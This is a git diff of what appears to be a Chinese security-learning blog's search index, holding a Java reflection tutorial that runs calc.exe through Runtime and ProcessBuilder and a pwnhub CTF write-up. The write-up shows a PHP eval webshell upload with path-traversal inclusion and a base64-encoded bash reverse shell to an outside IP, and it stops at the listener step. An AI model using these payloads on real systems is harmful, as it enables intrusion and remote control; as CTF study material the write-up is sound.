+<blockquote>
+<p>这里有个静态块，就是最后的static</p>
+<p>在实例化的时候会被自动加载</p>
+<p>关于JAVAssist不在此多做赘述</p>
+</blockquote>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318233518-9dfmw13.png" alt="image.png"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCLDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TestClassLoader</span> <span class="variable">myClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestClassLoader</span>(<span class="string">&quot;C:\\Users\\Liyc\\IdeaProjects\\JavassistTest\\out&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; newStudent = myClassLoader.loadClass(<span class="string">&quot;NewStudent&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; c = newStudent.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> c.newInstance(<span class="string">&quot;Xianbei&quot;</span>,<span class="number">19</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318233657-sw8m038.png" alt="image.png"></p>
+<p>成功弹出计算机，也就是成功加载了指定路径下的class文件并且用反射将其实例化了。</p>
+<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>贴几张好文和好图</p>
+<p><a href="https://www.cnblogs.com/goloving/p/14438785.html">https://www.cnblogs.com/goloving/p/14438785.html</a>讲双亲委派的</p>
+<p><a href="https://www.jianshu.com/p/fe8a01b0c3b7">https://www.jianshu.com/p/fe8a01b0c3b7</a>讲java代码运行机制的</p>
+<p><a href="https://zhuanlan.zhihu.com/p/67991761">https://zhuanlan.zhihu.com/p/67991761</a>讲类加载的</p>
+<p><a href="https://www.cnblogs.com/xrq730/p/4847337.html">https://www.cnblogs.com/xrq730/p/4847337.html</a>很多种类加载器的写法</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220318213310-uz3iggg.png" alt="image.png"></p>
+]]></content>
+      <categories>
+        <category>javaSec</category>
+      </categories>
+      <tags>
+        <tag>java基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【基础】-JAVA反射</title>
+    <url>/2022/03/04/myjavastudy002/</url>
+    <content><![CDATA[<h1 id="反射的概念"><a href="#反射的概念" class="headerlink" title="反射的概念"></a>反射的概念</h1><p>java反射机制不是很陌生的东西，总结一波反射中重要的概念：</p>
+<ol>
+<li>Java 反射机制允许<strong>运行中的</strong>Java程序获取<strong>自身的信息, 操作类和对象的内部属性.</strong></li>
+</ol>
+<p>&#x3D;&#x3D;&gt;<strong>“ 动态获取信息 “ 和 “ 动态调用属性方法 “</strong></p>
+<p>&#x3D;&#x3D;&gt;对象实例可以通过反射机制获取它的类（类类型）</p>
+<p>&#x3D;&#x3D;&gt;类可以通过反射机制获取它的所有方法和属性</p>
+<p>&#x3D;&#x3D;&gt;获取的属性可以设值，获取的方法可以调用</p>
+<p>反射最重要的用途是开发各种通用框架 . 很多框架都是通过XML文件来进行配置的( 例如 struts.xml , spring-*.xml 等 ) , 即所谓的框架核心配置文件 . 为了确保框架的通用性 , 程序<strong>运行时</strong>需要根据配置文件中对应的内容<strong>加载</strong>不同的类或对象 , 调用不同的方法 , 这也依赖于 Java 反射机制 .</p>
+<p>总的来说，通过反射我们可以：：</p>
+<ol>
+<li><strong>获得一个对象所属的类</strong></li>
+<li><strong>获得任意一个类的成员变量和方法</strong></li>
+<li><strong>构造任意一个类的对象</strong></li>
+<li><strong>任意调用一个对象的方法</strong></li>
+</ol>
+<p>纸上得来终觉浅，还是需要多实践来获得更深的理解</p>
+<p>反射的具体应用，在上一篇里面写的很详细</p>
+<h1 id="通过反射RCE"><a href="#通过反射RCE" class="headerlink" title="通过反射RCE"></a>通过反射RCE</h1><h2 id="java-lang-Runtime"><a href="#java-lang-Runtime" class="headerlink" title="java.lang.Runtime"></a>java.lang.Runtime</h2><p>第一个写的详细一点</p>
+<p><img src="https://o.130014.xyz/2022/03/04/image-20220304012210-bbgk8za.png" alt="image-20220304012210-bbgk8za.png"></p>
+<p>java.lang.Runtime 类的 exec() 方法是Java中最常见的执行命令的方式</p>
+<p>我们可以通过forName方法来加载任何类，当然也可以加载Runtime。</p>
+<p>调用exec方法的两个条件：</p>
+<ol>
+<li><p>一个实例对象，可以通过newInstance方法拿到</p>
+</li>
+<li><p>获取到具体的exec方法，反射中要获取一个方法需要知道方法名和参数类型</p>
+</li>
+</ol>
+<h3 id="方式1"><a href="#方式1" class="headerlink" title="方式1"></a>方式1</h3><p>1.获取exec方法</p>
+<p>（这里抛出了很多异常，暂时不讨论）</p>
+<p><img src="https://o.130014.xyz/2022/03/04/image-20220304013024-fncppyt.png" alt="image-20220304013024-fncppyt.png"></p>
+<p>2.获取实例对象然后尝试调用</p>
+<p><img src="https://o.130014.xyz/2022/03/04/image-20220304013242-v57tfyw.png" alt="image-20220304013242-v57tfyw.png"></p>
+<p>报错了，查看报错信息：</p>
+<p>class com.io.EncodingDemo cannot access a member of class java.lang.Runtime (in module java.base) with modifiers “private”</p>
+<p>跟进到Runtime方法里，发现他的构造方法是private，而newInstance会默认调用无参构造方法，这里牵扯到java的设计模式中的单例设计，比如在学习Servlet的时候遇到的ServletContext。</p>
+<blockquote>
+<p>单例模式有 3 个特点：<br>单例类只有一个实例对象；<br>该单例对象必须由单例类<strong>自行创建；</strong><br>单例类对外提供一个访问该单例的全局访问点。</p>
+<p><a href="http://c.biancheng.net/view/1338.html">http://c.biancheng.net/view/1338.html</a></p>
+</blockquote>
+<p>因此不能直接调用newInstance，要通过单例模式设计对象中的获取实例的方法，来获取一个runtime实例</p>
+<p><img src="https://o.130014.xyz/2022/03/04/image-20220304013856-gl5a5gu.png" alt="image-20220304013856-gl5a5gu.png"></p>
+<p>由于exec返回的是一个Process对象，我们要通过字节流把结果读出来</p>
+<p><a href="https://zhuanlan.zhihu.com/p/44957705">https://zhuanlan.zhihu.com/p/44957705</a></p>
+<p><img src="https://o.130014.xyz/2022/03/04/image-20220304015412-we3v4tx.png" alt="image-20220304015412-we3v4tx.png"></p>
+<h3 id="方式2"><a href="#方式2" class="headerlink" title="方式2"></a>方式2</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncodingDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(cls);</span><br><span class="line">        execMethod.invoke(runtime,<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看Epicccal师傅的博客中得知</p>
+<p>我们可以通过 <strong><code>对象.方法名</code> 来调用实例方法</strong> , <strong><code>类名.方法名</code> 来调用静态方法</strong> , 那么反过来 , <strong><code>方法名.invoke(对象)</code></strong> 可以映射成 <strong><code>方法名.invoke(类)</code></strong></p>
+<p>接着通过p牛的漫谈，思考下面几个问题</p>
+<h3 id="类没有无参构造方法，没有单例模式里的静态方法"><a href="#类没有无参构造方法，没有单例模式里的静态方法" class="headerlink" title="类没有无参构造方法，没有单例模式里的静态方法"></a>类没有无参构造方法，没有单例模式里的静态方法</h3><p>我们可以使用getConstructor方法，获取构造函数信息，它被封装在java.lang.reflect.Constructor中，当然他也需要特定的函数名和参数列表来获取这个唯一的构造函数</p>
+<p>获取到构造函数之后，用newInstance来执行</p>
+<p>例如ProcessBuilder类</p>
+<p><img src="https://o.130014.xyz/2022/03/04/image-20220304111005-qs9ld14.png" alt="image-20220304111005-qs9ld14.png"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure>
+
+<p>这里进行了强制类型转换，也就是直接调用了实例之后的ProcessBuilder，我们也可用反射来调用start</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="构造方法是私有方法，如何执行"><a href="#构造方法是私有方法，如何执行" class="headerlink" title="构造方法是私有方法，如何执行"></a>构造方法是私有方法，如何执行</h3><p>例子就是上面的Runtime类</p>
+<p>我们使用getDeclaredMethod方法，它能获取的是当前类中“声明”的方法，包括了私有方法，但不包括从父类继承过来的方法</p>
+<p>getMethod方法只能获取公共方法和从父类继承的方法</p>
+<p>我们在获取到一个私有方法后，必须用setAccessible 修改它的作用域，否则仍然不能调用。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; c = clazz.getDeclaredConstructor();</span><br><span class="line">c.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(c.newInstance(),<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="java-lang-ProcessBuilder"><a href="#java-lang-ProcessBuilder" class="headerlink" title="java.lang.ProcessBuilder"></a>java.lang.ProcessBuilder</h2><p>上文的Runtime类的exec方法，实质上就是通过ProcessBuilder来执行命令，通过跟进exec方法我们可以发现：</p>
+<p><img src="https://o.130014.xyz/2022/03/04/image-20220304113001-sz96lzx.png" alt="image-20220304113001-sz96lzx.png"></p>
+<p>我们直接通过ProcessBuilder执行命令：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>
+
+<p>可以通过cmdarray，传入数组来执行带参数的数据</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Arrays.asList(<span class="string">&quot;ping&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h1><p>王哥，我的超人</p>
+<p><a href="https://forum.butian.net/share/1333">https://forum.butian.net/share/1333</a></p>
+]]></content>
+      <categories>
+        <category>javaSec</category>
+      </categories>
+      <tags>
+        <tag>java基础</tag>
       </tags>
   </entry>
   <entry>
@@ -1845,96 +1935,6 @@
       </tags>
   </entry>
   <entry>
-    <title>【基础】-JAVA反射</title>
-    <url>/2022/03/04/myjavastudy002/</url>
-    <content><![CDATA[<h1 id="反射的概念"><a href="#反射的概念" class="headerlink" title="反射的概念"></a>反射的概念</h1><p>java反射机制不是很陌生的东西，总结一波反射中重要的概念：</p>
-<ol>
-<li>Java 反射机制允许<strong>运行中的</strong>Java程序获取<strong>自身的信息, 操作类和对象的内部属性.</strong></li>
-</ol>
-<p>&#x3D;&#x3D;&gt;<strong>“ 动态获取信息 “ 和 “ 动态调用属性方法 “</strong></p>
-<p>&#x3D;&#x3D;&gt;对象实例可以通过反射机制获取它的类（类类型）</p>
-<p>&#x3D;&#x3D;&gt;类可以通过反射机制获取它的所有方法和属性</p>
-<p>&#x3D;&#x3D;&gt;获取的属性可以设值，获取的方法可以调用</p>
-<p>反射最重要的用途是开发各种通用框架 . 很多框架都是通过XML文件来进行配置的( 例如 struts.xml , spring-*.xml 等 ) , 即所谓的框架核心配置文件 . 为了确保框架的通用性 , 程序<strong>运行时</strong>需要根据配置文件中对应的内容<strong>加载</strong>不同的类或对象 , 调用不同的方法 , 这也依赖于 Java 反射机制 .</p>
-<p>总的来说，通过反射我们可以：：</p>
-<ol>
-<li><strong>获得一个对象所属的类</strong></li>
-<li><strong>获得任意一个类的成员变量和方法</strong></li>
-<li><strong>构造任意一个类的对象</strong></li>
-<li><strong>任意调用一个对象的方法</strong></li>
-</ol>
-<p>纸上得来终觉浅，还是需要多实践来获得更深的理解</p>
-<p>反射的具体应用，在上一篇里面写的很详细</p>
-<h1 id="通过反射RCE"><a href="#通过反射RCE" class="headerlink" title="通过反射RCE"></a>通过反射RCE</h1><h2 id="java-lang-Runtime"><a href="#java-lang-Runtime" class="headerlink" title="java.lang.Runtime"></a>java.lang.Runtime</h2><p>第一个写的详细一点</p>
-<p><img src="https://o.130014.xyz/2022/03/04/image-20220304012210-bbgk8za.png" alt="image-20220304012210-bbgk8za.png"></p>
-<p>java.lang.Runtime 类的 exec() 方法是Java中最常见的执行命令的方式</p>
-<p>我们可以通过forName方法来加载任何类，当然也可以加载Runtime。</p>
-<p>调用exec方法的两个条件：</p>
-<ol>
-<li><p>一个实例对象，可以通过newInstance方法拿到</p>
-</li>
-<li><p>获取到具体的exec方法，反射中要获取一个方法需要知道方法名和参数类型</p>
-</li>
-</ol>
-<h3 id="方式1"><a href="#方式1" class="headerlink" title="方式1"></a>方式1</h3><p>1.获取exec方法</p>
-<p>（这里抛出了很多异常，暂时不讨论）</p>
-<p><img src="https://o.130014.xyz/2022/03/04/image-20220304013024-fncppyt.png" alt="image-20220304013024-fncppyt.png"></p>
-<p>2.获取实例对象然后尝试调用</p>
-<p><img src="https://o.130014.xyz/2022/03/04/image-20220304013242-v57tfyw.png" alt="image-20220304013242-v57tfyw.png"></p>
-<p>报错了，查看报错信息：</p>
-<p>class com.io.EncodingDemo cannot access a member of class java.lang.Runtime (in module java.base) with modifiers “private”</p>
-<p>跟进到Runtime方法里，发现他的构造方法是private，而newInstance会默认调用无参构造方法，这里牵扯到java的设计模式中的单例设计，比如在学习Servlet的时候遇到的ServletContext。</p>
-<blockquote>
-<p>单例模式有 3 个特点：<br>单例类只有一个实例对象；<br>该单例对象必须由单例类<strong>自行创建；</strong><br>单例类对外提供一个访问该单例的全局访问点。</p>
-<p><a href="http://c.biancheng.net/view/1338.html">http://c.biancheng.net/view/1338.html</a></p>
-</blockquote>
-<p>因此不能直接调用newInstance，要通过单例模式设计对象中的获取实例的方法，来获取一个runtime实例</p>
-<p><img src="https://o.130014.xyz/2022/03/04/image-20220304013856-gl5a5gu.png" alt="image-20220304013856-gl5a5gu.png"></p>
-<p>由于exec返回的是一个Process对象，我们要通过字节流把结果读出来</p>
-<p><a href="https://zhuanlan.zhihu.com/p/44957705">https://zhuanlan.zhihu.com/p/44957705</a></p>
-<p><img src="https://o.130014.xyz/2022/03/04/image-20220304015412-we3v4tx.png" alt="image-20220304015412-we3v4tx.png"></p>
-<h3 id="方式2"><a href="#方式2" class="headerlink" title="方式2"></a>方式2</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncodingDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(cls);</span><br><span class="line">        execMethod.invoke(runtime,<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>看Epicccal师傅的博客中得知</p>
-<p>我们可以通过 <strong><code>对象.方法名</code> 来调用实例方法</strong> , <strong><code>类名.方法名</code> 来调用静态方法</strong> , 那么反过来 , <strong><code>方法名.invoke(对象)</code></strong> 可以映射成 <strong><code>方法名.invoke(类)</code></strong></p>
-<p>接着通过p牛的漫谈，思考下面几个问题</p>
-<h3 id="类没有无参构造方法，没有单例模式里的静态方法"><a href="#类没有无参构造方法，没有单例模式里的静态方法" class="headerlink" title="类没有无参构造方法，没有单例模式里的静态方法"></a>类没有无参构造方法，没有单例模式里的静态方法</h3><p>我们可以使用getConstructor方法，获取构造函数信息，它被封装在java.lang.reflect.Constructor中，当然他也需要特定的函数名和参数列表来获取这个唯一的构造函数</p>
-<p>获取到构造函数之后，用newInstance来执行</p>
-<p>例如ProcessBuilder类</p>
-<p><img src="https://o.130014.xyz/2022/03/04/image-20220304111005-qs9ld14.png" alt="image-20220304111005-qs9ld14.png"></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure>
-
-<p>这里进行了强制类型转换，也就是直接调用了实例之后的ProcessBuilder，我们也可用反射来调用start</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="构造方法是私有方法，如何执行"><a href="#构造方法是私有方法，如何执行" class="headerlink" title="构造方法是私有方法，如何执行"></a>构造方法是私有方法，如何执行</h3><p>例子就是上面的Runtime类</p>
-<p>我们使用getDeclaredMethod方法，它能获取的是当前类中“声明”的方法，包括了私有方法，但不包括从父类继承过来的方法</p>
-<p>getMethod方法只能获取公共方法和从父类继承的方法</p>
-<p>我们在获取到一个私有方法后，必须用setAccessible 修改它的作用域，否则仍然不能调用。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; c = clazz.getDeclaredConstructor();</span><br><span class="line">c.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(c.newInstance(),<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="java-lang-ProcessBuilder"><a href="#java-lang-ProcessBuilder" class="headerlink" title="java.lang.ProcessBuilder"></a>java.lang.ProcessBuilder</h2><p>上文的Runtime类的exec方法，实质上就是通过ProcessBuilder来执行命令，通过跟进exec方法我们可以发现：</p>
-<p><img src="https://o.130014.xyz/2022/03/04/image-20220304113001-sz96lzx.png" alt="image-20220304113001-sz96lzx.png"></p>
-<p>我们直接通过ProcessBuilder执行命令：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>
-
-<p>可以通过cmdarray，传入数组来执行带参数的数据</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Arrays.asList(<span class="string">&quot;ping&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h1 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h1><p>王哥，我的超人</p>
-<p><a href="https://forum.butian.net/share/1333">https://forum.butian.net/share/1333</a></p>
-]]></content>
-      <categories>
-        <category>javaSec</category>
-      </categories>
-      <tags>
-        <tag>java基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【基础】-RMI原理及流程</title>
     <url>/2022/03/05/myjavastudy003/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习过程中发现有很多“概念性”的东西，导致大段的文字说明出现。</p>
@@ -2059,6 +2059,64 @@
       </categories>
       <tags>
         <tag>nginx</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwnhub2022春季赛</title>
+    <url>/2022/04/27/pwnhub2022%E6%98%A5%E5%AD%A3%E8%B5%9B/</url>
+    <content><![CDATA[<h1 id="pwnhub春季赛web"><a href="#pwnhub春季赛web" class="headerlink" title="pwnhub春季赛web"></a>pwnhub春季赛web</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>周末一堆事情，而且周日正常上课，搞得没有好好打。所以认真复现一下。</p>
+<h1 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1><blockquote>
+<ol>
+<li>mysql恶意服务端读取文件</li>
+<li>路径拼接导致的文件包含</li>
+</ol>
+</blockquote>
+<p>mysql恶意服务端读取任意文件</p>
+<p>然后路径大概是这样：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/www/html/route/route.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/baseTool.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/userTools/mysqlTool.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/userTools/base64Tool.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/userTools/testTool.php</span><br></pre></td></tr></table></figure>
+
+
+<p>读取到testTool的时候就发现了hint</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">testTool</span> <span class="keyword">extends</span> <span class="title">baseTool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>] = <span class="variable">$arg</span>[<span class="string">&#x27;Y0U_CA0_n3vEr_F1nD_m3_LOL&#x27;</span>] <span class="keyword">or</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">userToolInit</span>(<span class="keyword">__CLASS__</span>, <span class="string">&#x27;./index.php?s=tool/test&#x27;</span>, <span class="string">&#x27;testxe7xb1xbb&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;/tmp/sandbox&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>]);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;output = <span class="variable">$value</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>];</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&#x27;/tmp/sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="variable">$path</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$value</span>[<span class="string">&#x27;file&#x27;</span>]), <span class="variable">$value</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;output = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="string">&#x27;test&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;output;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>他有一个反序列化字符串的地方，没有过滤或者限制</p>
+<p>因此直接就能phpinfo</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427231142-x05ny6k.png" alt="image.png"></p>
+<p>但是并没有什么用，不过我们可以知道remote_addr的值为218.94.97.29</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427223626-o2z27cp.png" alt="image.png"></p>
+<p>接下来尝试用下面的方法写shell进去，没有任何过滤</p>
+<p>但是写入的shell会在<code>/tmp/sandbox/027abbac7d8dc5486b5f33965cfce8c4/</code>目录下，没办法直接访问</p>
+<p>因为<code>$this-&gt;class</code>可控而且拼接，所以可以直接目录穿越包含刚刚写入的shell</p>
+<p>但是这里要注意他有个后缀<code>Tool.php</code>，因此写入的时候让文件名也是<code>xxxTool.php</code>即可</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427232239-1j95apf.png" alt="image.png"></p>
+<p>写入：</p>
+<p>post</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Y0U_CA0_n3vEr_F1nD_m3_LOL[file]=asoulTool.php&amp;Y0U_CA0_n3vEr_F1nD_m3_LOL[data]=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>包含：</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427232053-xffndtq.png" alt="image.png"></p>
+<h1 id="EzPDFParser"><a href="#EzPDFParser" class="headerlink" title="EzPDFParser"></a>EzPDFParser</h1><blockquote>
+<p><a href="https://votiro.com/blog/preventing-log4j-cve-2021-44228-exploits-using-pdf-as-a-delivery-channel/">https://votiro.com/blog/preventing-log4j-cve-2021-44228-exploits-using-pdf-as-a-delivery-channel/</a></p>
+<p>漏洞复现类赛题</p>
+</blockquote>
+<p>通过题目war包可以看到log4j的依赖</p>
+<p>反弹shell</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">bash -c &#123;<span class="keyword">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy4xNDQuNDEvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p>vps开启监听</p>
